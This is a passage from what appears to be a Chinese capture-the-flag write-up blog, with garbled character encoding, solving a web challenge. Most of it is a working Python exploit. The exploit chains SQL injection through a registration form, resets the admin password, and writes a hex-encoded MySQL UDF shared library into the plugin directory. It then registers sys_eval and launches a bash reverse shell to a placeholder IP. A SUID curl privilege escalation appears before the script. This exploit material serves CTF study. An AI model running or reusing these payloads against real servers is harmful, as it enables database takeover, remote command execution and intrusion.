<span class="token string">';CREATE FUNCTION sys_eval RETURNS STRING SONAME '</span>exp<span class="token punctuation">.</span>so<span class="token string">';#
# æ‰§è¡Œå‘½ä»¤
'</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h4><p>æ‰§è¡Œ<code>echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#39;|sh</code></p>
<img src="/article/eruditeFlower/image-20221007121541949.png" class="" title="image-20221007121541949" loading="lazy">

<h4 id="å°ææƒ"><a href="#å°ææƒ" class="headerlink" title="å°ææƒ"></a>å°ææƒ</h4><p>ç›´æ¥<code>cat /flag</code>æ²¡æœ‰æƒé™ï¼Œæœ‰ä¸ªå°ææƒåœ¨è¿™é‡Œï¼Œä¸æ˜¯å¾ˆå¤æ‚ï¼ŒæŸ¥æ‰¾æœ‰suidçš„ç¨‹åº<code>find / -perm -u=s -type f 2&gt;/dev/null</code>ï¼Œå¯ä»¥çœ‹åˆ°curlæœ‰suidæƒé™ï¼Œä¸”æˆ‘ä»¬æœ‰curlçš„æ‰§è¡Œæƒé™ï¼Œå› æ­¤æ‰§è¡Œ<code>curl file:///flag</code>å³å¯è·å¾—flag</p>
<img src="/article/eruditeFlower/image-20221007122036015.png" class="" title="image-20221007122036015" loading="lazy">

<p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åœ¨é¡µé¢ä¸Šä¸€å¥å¥æ‰§è¡Œï¼Œåªä¸è¿‡æœ‰äº›å¤æ‚ï¼Œä½†æ€»å½’ä¸å¯èƒ½ç›´æ¥å°±çŸ¥é“curlæœ‰suidæƒé™ï¼Œä¸å¯èƒ½ç›´æ¥curlè¯»flagçš„ï¼Œæ¯•ç«Ÿè¿˜æ˜¯æœ‰ä¸ªå°è€ƒç‚¹ä¸€ä¸ªå°æµç¨‹åœ¨è¿™çš„</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
-*- coding: utf-8 -*-
@File: exp.py
@Author: Err0r
@Time: 3æœˆ 13, 2021
"""</span>
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:20712"</span>

CMD <span class="token operator">=</span> <span class="token string">"echo '/bin/bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1'|sh"</span>

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
COOKIES <span class="token operator">=</span> <span class="token punctuation">&#123;</span>

<span class="token punctuation">&#125;</span>
HEADERS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"</span><span class="token punctuation">,</span>
    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'get'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># print(url)</span>
    data <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span>
    params <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"params"</span><span class="token punctuation">)</span>
    cookies<span class="token punctuation">.</span>update<span class="token punctuation">(</span>COOKIES<span class="token punctuation">)</span>
    headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span>HEADERS<span class="token punctuation">)</span>
    <span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">:</span>
        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
            url<span class="token operator">=</span>url<span class="token punctuation">,</span>
            data<span class="token operator">=</span>data<span class="token punctuation">,</span>
            params<span class="token operator">=</span>params<span class="token punctuation">,</span>
            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
            cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>
            timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span>
            allow_redirects<span class="token operator">=</span>allow_redirects
        <span class="token punctuation">)</span>
    <span class="token keyword">elif</span> method <span class="token operator">==</span> <span class="token string">'post'</span><span class="token punctuation">:</span>
        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
            url<span class="token operator">=</span>url<span class="token punctuation">,</span>
            data<span class="token operator">=</span>data<span class="token punctuation">,</span>
            params<span class="token operator">=</span>params<span class="token punctuation">,</span>
            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
            cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>
            timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span>
            allow_redirects<span class="token operator">=</span>allow_redirects
        <span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># close session</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Requests method error.'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">getRadmonStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">reg</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/register.php"</span>
    studentid <span class="token operator">=</span> getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span>
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"username"</span><span class="token punctuation">:</span> sql<span class="token punctuation">,</span>
        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>
        <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"æäº¤"</span>
    <span class="token punctuation">&#125;</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> studentid


<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> studentid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/login.php"</span>
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>
        <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"æäº¤"</span>
    <span class="token punctuation">&#125;</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>
    <span class="token comment"># print(res)</span>
    <span class="token keyword">return</span> res


<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/logout.php"</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">postAns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/index.php"</span>
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"q1"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
        <span class="token string">"q2"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
        <span class="token string">"q3"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>
        <span class="token comment"># "q6": "5"</span>
        <span class="token string">"q4"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
        <span class="token string">"q5"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>
    <span class="token comment"># print(res)</span>


<span class="token keyword">def</span> <span class="token function">posScore</span><span class="token punctuation">(</span>studentid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/score.php"</span>
    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>
    <span class="token comment"># print(res)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    passwd <span class="token operator">=</span> getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span>
    poc <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token comment"># è¿™é‡Œå¯ä»¥åˆ©ç”¨ç‰¹æ€§ç›´æ¥selectè·å–åˆ°adminå¯†ç ï¼Œæˆ–è€…åƒè¿™æ ·ç›´æ¥ä¿®æ”¹adminå¯†ç </span>
        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">');update users set studentid='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">' where username='admin';\x23"</span></span><span class="token punctuation">,</span>
        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';select 0x7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000 into dumpfile '/usr/lib64/mysql/plugin/exp.so';\x23"</span></span><span class="token punctuation">,</span>
        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'exp.so';\x23"</span></span><span class="token punctuation">,</span>
        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';select sys_eval(\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>CMD<span class="token punctuation">&#125;</span></span><span class="token string">\");\x23"</span></span>
    <span class="token punctuation">]</span>
    pocStudentId <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> poc<span class="token punctuation">:</span>
        pocStudentId<span class="token punctuation">.</span>append<span class="token punctuation">(</span>reg<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Ready to get admin"</span><span class="token punctuation">)</span>
    login<span class="token punctuation">(</span>poc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pocStudentId<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    postAns<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*][?]set admin passwd: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    logout<span class="token punctuation">(</span><span class="token punctuation">)</span>
    loginRes <span class="token operator">=</span> login<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> passwd<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"something err0r"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> loginRes <span class="token keyword">and</span> <span class="token string">"é”™è¯¯"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> loginRes<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]login as admin success!"</span><span class="token punctuation">)</span>
